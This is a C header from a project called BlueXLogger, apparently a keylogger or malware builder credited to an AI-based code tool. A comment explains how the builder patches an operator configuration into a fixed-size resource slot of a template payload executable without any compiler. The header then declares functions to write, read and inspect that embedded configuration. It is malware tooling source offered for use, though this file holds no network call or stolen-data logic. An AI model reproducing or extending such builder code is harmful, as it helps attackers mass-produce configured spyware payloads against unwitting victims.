/*============================================================================
 * BlueXLogger - bxl_patch.h
 * Embed an operator configuration into a payload EXE.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * How the embedding works
 * -----------------------
 * The payload template ships with a fixed-size RCDATA slot named BXL_CFG
 * (BXL_CFG_SLOT_SIZE bytes) containing a placeholder blob. Because the slot
 * size never changes, the builder does not need to rebuild the resource
 * directory or any PE section:
 *
 *   1. copy the template EXE to the output path
 *   2. map the template with LOAD_LIBRARY_AS_IMAGE_RESOURCE
 *   3. FindResourceW(BXL_CFG, RT_RCDATA) -> LockResource -> pointer
 *   4. RVA = pointer - module base;  file offset = RVA - section VA + raw ptr
 *   5. overwrite exactly SizeofResource bytes at that offset in the output
 *
 * No compiler, linker or MSBuild is required at build time, which is why the
 * builder works on a machine with no toolchain installed.
 *==========================================================================*/
#ifndef BXL_PATCH_H
#define BXL_PATCH_H

#include "bxl_common.h"
#include "bxl_config.h"

/* Produce out_exe by copying template_exe and patching in cfg.
 * Returns BXL_TRUE on success; err receives a reason on failure. */
int bxl_patch_write(const wchar_t *template_exe, const wchar_t *out_exe,
                    const BxlConfig *cfg, char *err, size_t err_cch);

/* Read the embedded configuration back out of an EXE on disk.
 * Returns BXL_TRUE when a *configured* blob was found. */
int bxl_patch_read(const wchar_t *exe, BxlConfig *cfg, char *err, size_t err_cch);

/* Inspect a template: reports whether the slot exists, its size, and whether
 * it still holds the placeholder. */
int bxl_patch_inspect(const wchar_t *exe, int *slot_found, bxl_u32 *slot_size,
                      int *is_placeholder, char *err, size_t err_cch);

#endif /* BXL_PATCH_H */
